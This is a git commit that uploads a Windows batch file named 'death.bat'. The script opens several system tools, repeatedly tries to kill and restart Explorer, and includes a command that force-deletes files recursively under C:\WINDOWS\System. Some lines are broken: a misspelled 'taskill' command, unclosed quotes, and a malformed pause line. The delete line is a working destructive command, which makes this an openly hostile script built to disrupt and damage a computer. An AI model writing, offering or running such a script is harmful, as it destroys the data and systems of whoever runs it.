c1f3750810e2a1418160dd9ccfdfe6c1bfd8fd53
Noob756 <outbot0@gmail.com>
2025-01-28 21:51:29 -0800

    Add files via upload

---
+++ death.bat
@@ -0,0 +1,33 @@
+@echo off
+start notepad
+start taskmgr
+start explorer
+start regedit
+start wmplayer
+start cmd.exe
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+
+cmd /c "taskill /f /im explorer.exe && start explorer
+
+cmd /c "del C:\WINDOWS\System\*.* /f /s /q
+
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+cmd /c "taskill /f /im explorer.exe && start explorer
+start wmplayer.exe
+:pause:
